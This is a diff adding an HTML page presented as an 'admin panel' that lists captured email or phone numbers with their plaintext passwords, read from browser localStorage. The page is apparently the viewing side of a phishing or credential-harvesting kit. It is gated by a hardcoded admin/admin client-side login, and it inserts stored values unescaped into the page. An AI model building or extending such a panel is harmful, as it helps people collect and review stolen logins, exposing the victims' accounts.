@@ -1,0 +1,324 @@
+<!DOCTYPE html>
+<!-- Coding By Mongrey Marma - www.mongreycode.com -->
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Details</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 20px;
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 20px;
+        }
+        th, td {
+            padding: 10px;
+            border-bottom: 1px solid #ddd;
+        }
+        th {
+            background-color: #f2f2f2;
+        }
+        .confirmation-popup {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            justify-content: center;
+            align-items: center;
+        }
+        .popup-content {
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 5px;
+            text-align: center;
+        }
+        .popup-buttons button {
+            margin: 5px;
+        }
+        .delete-button {
+            background-color: red;
+            color: white;
+        }
+        .yes-button {
+            background-color: red;
+            color: white;
+        }
+
+        .login-popup {
+            display: none; /* initially hidden */
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: white;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .popup-content {
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 5px;
+            text-align: center;
+        }
+
+        .login-popup form {
+            display: inline-block;
+            text-align: left;
+        }
+
+        .login-popup input[type="text"],
+        .login-popup input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            margin: 5px 0;
+            box-sizing: border-box;
+            border-radius: 30px;
+        }
+
+        .login-popup button {
+            display: block;
+            margin: 0 auto;
+            padding: 10px 20px;
+            background-color: green;
+            color: #fff;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+
+        .login-popup button:hover {
+            background-color: #0056b3;
+        }
+
+        .error-message {
+            color: red;
+        }
+
+        /* Device List Styles */
+        #deviceList {
+            display: none; /* initially hidden */
+            padding: 20px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            background-color: #fff;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.3);
+            margin-top: 20px;
+        }
+
+        #deviceList h2 {
+            text-align: center;
+        }
+
+        .deviceEntry {
+            margin-bottom: 10px;
+        }
+
+        .deviceEntry button {
+            margin-left: 10px;
+            padding: 5px 10px;
+            background-color: red;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+
+        .deviceEntry button:hover {
+            background-color: darkred;
+        }
+    </style>
+</head>
+<body>
+  
+<!-- Device List -->
+<div id="deviceList">
+    <h2>Logged in Devices</h2>
+    <div id="deviceEntries"></div>
+</div>
+
+<!-- Full-Screen Login Popup -->
+<div class="login-popup" id="loginPopup">
+    <div class="popup-content">
+        <h2>Login to admin</h2>
+        <form id="loginForm">
+            <label for="username">Username:</label><br>
+            <input type="text" id="username" name="username"><br>
+            <label for="password">Password:</label><br>
+            <input type="password" id="password" name="password"><br>
+            <span id="passwordError" class="error-message"></span><br>
+            <button type="button" onclick="validateLogin()">Login</button>
+        </form>
+    </div>
+</div>
+
+<!-- Main Content -->
+<div id="mainContent">
+    <h1>admin panel/Login Details</h1>
+    <table>
+        <thead>
+            <tr>
+                <th>Timestamp</th>
+                <th>Email/Number</th>
+                <th>Password</th>
+                <th>Action</th>
+            </tr>
+        </thead>
+        <tbody id="loginDetailsBody">
+            <!-- Login details will be dynamically added here -->
+        </tbody>
+    </table>
+
+    <!-- Confirmation Popup -->
+    <div class="confirmation-popup" id="confirmationPopup">
+        <div class="popup-content">
+            <p>Are you sure you want to delete this login detail?</p>
+            <div class="popup-buttons">
+                <button class="yes-button" onclick="deleteLoginDetail(true)">Yes</button>
+                <button onclick="deleteLoginDetail(false)">No</button>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    // Check if device info is already stored
+    const deviceInfo = JSON.parse(localStorage.getItem('deviceInfo'));
+    if (deviceInfo) {
+        // If device info is found, show main content
+        document.getElementById('mainContent').style.display = 'block';
+        // Update device list
+        updateDeviceList();
+    } else {
+        // If device info is not found, show login popup
+        document.getElementById('loginPopup').style.display = 'flex';
+    }
+
+    // Retrieve login details from local storage, sort them by timestamp, and display them in the table
+    window.onload = function() {
+        var loginDetailsBody = document.getElementById("loginDetailsBody");
+        var keys = Object.keys(localStorage).filter(key => key.startsWith("login_"));
+
+        // Sort keys by timestamp (descending order)
+        keys.sort((a, b) => parseInt(b.split("_")[1]) - parseInt(a.split("_")[1]));
+
+        keys.forEach(function(key) {
+            var loginInfo = JSON.parse(localStorage.getItem(key));
+            var timestamp = new Date(parseInt(key.split("_")[1]));
+            var formattedTimestamp = timestamp.toLocaleString();
+
+            var row = "<tr>" +
+                          "<td>" + formattedTimestamp + "</td>" +
+                          "<td>" + loginInfo.emailOrNumber + "</td>" +
+                          "<td>" + loginInfo.password + "</td>" +
+                          "<td><button class=\"delete-button\" onclick=\"showConfirmationPopup('" + key + "')\">Delete</button></td>" +
+                      "</tr>";
+
+            // Append the row to the table body
+            loginDetailsBody.innerHTML += row;
+        });
+    };
+
+    // Function to show confirmation popup and pass key for deletion
+    function showConfirmationPopup(key) {
+        var confirmationPopup = document.getElementById("confirmationPopup");
+        confirmationPopup.style.display = "flex";
+        confirmationPopup.dataset.key = key;
+    }
+
+    // Function to delete login detail based on confirmation
+    function deleteLoginDetail(confirmation) {
+        var confirmationPopup = document.getElementById("confirmationPopup");
+        if (confirmation) {
+            var key = confirmationPopup.dataset.key;
+            localStorage.removeItem(key);
+            window.location.reload(); // Refresh page to reflect changes
+        }
+        confirmationPopup.style.display = "none";
+    }
+
+    // Function to update device list
+    function updateDeviceList() {
+        const deviceInfo = JSON.parse(localStorage.getItem('deviceInfo'));
+        const deviceEntries = document.getElementById('deviceEntries');
+        deviceEntries.innerHTML = ''; // Clear existing entries
+        
+        if (deviceInfo) {
+            const deviceEntry = document.createElement('div');
+            deviceEntry.classList.add('deviceEntry');
+            deviceEntry.innerHTML = `
+                <p><strong>Device Name:</strong> ${deviceInfo.deviceName}</p>
+                <button onclick="removeDevice()">Remove</button>
+            `;
+            deviceEntries.appendChild(deviceEntry);
+        }
+        
+        document.getElementById('deviceList').style.display = 'block';
+    }
+
+    // Function to remove device entry
+    function removeDevice() {
+        localStorage.removeItem('deviceInfo');
+        document.getElementById('deviceList').style.display = 'none';
+        // Hide main content and show login popup
+        document.getElementById('mainContent').style.display = 'none';
+        document.getElementById('loginPopup').style.display = 'flex';
+    }
+
+    // Function to validate login credentials
+    function validateLogin() {
+        var usernameInput = document.getElementById("username");
+        var passwordInput = document.getElementById("password");
+        var username = usernameInput.value;
+        var password = passwordInput.value;
+        var passwordError = document.getElementById("passwordError");
+
+        // Reset previous error message and style
+        passwordError.textContent = "";
+        usernameInput.classList.remove("invalid");
+        passwordInput.classList.remove("invalid");
+
+        // Check if username field is filled
+        if (username.trim() === "") {
+            passwordError.textContent = "Please enter a username.";
+            usernameInput.classList.add("invalid");
+            return;
+        }
+
+        // Check if password field is filled
+        if (password.trim() === "") {
+            passwordError.textContent = "Please enter a password.";
+            passwordInput.classList.add("invalid");
+            return;
+        }
+
+        // Check if username and password match the predefined values
+        if (username !== "admin" || password !== "admin") {
+            // If username or password is incorrect, display error message and highlight the input fields in red
+            passwordError.textContent = "Invalid username or password.";
+            usernameInput.classList.add("invalid");
+            passwordInput.classList.add("invalid");
+        } else {
+            // If username and password are correct, hide the login popup
+            document.getElementById("loginPopup").style.display = "none";
+            // Save device info
+            const deviceInfo = { deviceName: navigator.userAgent };
+            localStorage.setItem('deviceInfo', JSON.stringify(deviceInfo));
+            // Show main content and update device list
+            document.getElementById('mainContent').style.display = 'block';
+            updateDeviceList();
+        }
+    }
+</script>
+
+</body>
+</html>
